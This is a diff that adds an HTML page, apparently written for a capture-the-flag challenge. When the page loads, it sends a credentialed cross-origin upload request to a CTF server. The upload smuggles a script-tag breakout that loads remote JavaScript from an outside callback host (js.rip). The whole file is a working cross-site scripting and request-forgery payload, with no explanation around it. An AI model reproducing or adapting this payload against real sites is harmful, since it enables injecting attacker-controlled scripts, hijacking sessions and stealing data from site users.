@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>JavaScript Injection Example</title>
+    <script>
+        window.onload = function() {
+            var xhr = new XMLHttpRequest();
+            var formData = new FormData();
+
+            // Constructing the payload with the desired script injection
+            var body = "-----------------------------110423259726704186431623284180\r\n" + 
+                "Content-Disposition: form-data; name=\"qrcode\"\r\n" + 
+                "Content-Type: text/plain\r\n" + 
+                "\r\n" + 
+                "</script><script src=\"https://js.rip/bt7jtmfeop\"></script>\r\n" + 
+                "-----------------------------110423259726704186431623284180--\r\n";
+
+            var uint8Array = new Uint8Array(body.length);
+            for (var i = 0; i < uint8Array.length; i++) {
+                uint8Array[i] = body.charCodeAt(i);
+            }
+
+            var blob = new Blob([uint8Array], { type: 'text/plain' });
+
+            formData.append('qrcode', blob);
+
+            xhr.open('POST', 'http://ctf.widyasecurity.com/upload', true);
+            xhr.setRequestHeader('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8');
+            xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.5');
+            xhr.withCredentials = true;
+
+            xhr.onload = function() {
+                if (xhr.status === 200) {
+                    console.log('Payload sent successfully');
+                    // Optionally redirect or perform other actions on success
+                } else {
+                    console.error('Payload failed to send. Status: ' + xhr.status);
+                }
+            };
+
+            xhr.onerror = function() {
+                console.error('Request failed');
+            };
+
+            xhr.send(formData);
+        };
+    </script>
+</head>
+<body>
+</body>
+</html>
